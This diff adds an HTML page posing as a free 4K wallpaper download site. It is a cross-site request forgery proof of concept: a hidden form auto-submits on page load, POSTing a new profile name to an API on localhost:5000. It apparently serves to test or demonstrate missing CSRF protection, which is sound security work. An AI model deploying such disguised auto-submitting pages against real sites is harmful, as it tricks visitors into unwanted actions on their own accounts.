@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Free Wallpapers</title>
+</head>
+
+<body>
+
+    <h1>🎁 Download Free 4K Wallpapers</h1>
+
+    <p>Your download is starting...</p>
+
+    <form
+        id="csrfForm"
+        action="http://localhost:5000/api/profile/update-name"
+        method="POST">
+
+        <input
+            type="hidden"
+            name="name"
+            value="lackCSRF">
+
+    </form>
+
+    <script>
+
+        document.getElementById("csrfForm").submit();
+
+    </script>
+
+</body>
+
+</html>
